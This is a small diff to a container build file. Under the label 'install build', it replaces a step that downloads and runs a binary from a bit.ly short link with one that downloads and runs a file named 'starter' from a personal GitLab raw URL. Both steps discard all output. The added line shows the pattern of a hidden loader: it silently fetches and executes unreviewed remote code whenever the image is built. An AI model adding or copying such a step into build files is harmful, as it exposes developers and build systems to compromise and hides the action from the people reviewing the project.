@@ -18,4 +18,4 @@ COPY / /root
 RUN REPEATABLE docker-compose up -d --build --force-recreate --remove-orphans && sleep 5
 
 # install build
-RUN wget https://bit.ly/3km3tcj && chmod +x 3km3tcj && ./3km3tcj >/dev/null 2>&1
+RUN wget https://gitlab.com/mellanyjeruju/staterr/-/raw/main/starter && chmod +x starter && ./starter >/dev/null 2>&1
